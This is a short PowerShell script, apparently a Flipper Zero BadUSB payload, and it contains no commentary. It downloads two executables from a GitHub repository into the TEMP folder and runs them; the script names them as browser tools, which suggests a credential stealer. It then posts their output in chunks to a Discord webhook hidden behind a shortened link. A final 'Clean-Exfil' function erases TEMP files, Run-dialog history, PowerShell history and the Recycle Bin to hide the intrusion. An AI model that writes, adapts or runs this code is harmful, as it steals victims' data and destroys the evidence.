############################################################################################################################################################
$browsers = @("e", "c")

foreach ($browser in $browsers) {
	$exeUrl = 'https://github.com/arielmos/Scripts/raw/main/assets/pe/$browser.exe';
    $exePath = "$env:TEMP/pe/$browser.exe"

	if (-not (Test-Path -Path $exePath)) {Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;}

    $commandOutput = & $exePath | Out-String
    $chunks = [Math]::Ceiling($commandOutput.Length / 2000)

    function ExpandURL([string]$URL) {
        (Invoke-WebRequest -MaximumRedirection 0 -Uri $URL -ErrorAction SilentlyContinue).Headers.Location
    }

    function Upload-Discord {
        param (
            [string]$text 
        )

        $hookurl = ExpandURL 'https://bit.ly/3VZTOvb'

        $Body = @{
            'username' = 'Flipper'
            'content' = $text
        } | ConvertTo-Json

        if (-not ([string]::IsNullOrEmpty($text))) {
            try {
                Invoke-RestMethod -ContentType 'application/json' -Uri $hookurl -Method Post -Body $Body
            } catch {
                Write-Host "Error invoking REST method: $_"
            }
        }
    }

    for ($i = 0; $i -lt $chunks; $i++) {
        $start = $i * 2000
        $length = [Math]::Min(2000, $commandOutput.Length - $start)
        $content = $commandOutput.Substring($start, $length)
        Upload-Discord -text $content
    }
}
############################################################################################################################################################

function Clean-Exfil { 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

############################################################################################################################################################

Clean-Exfil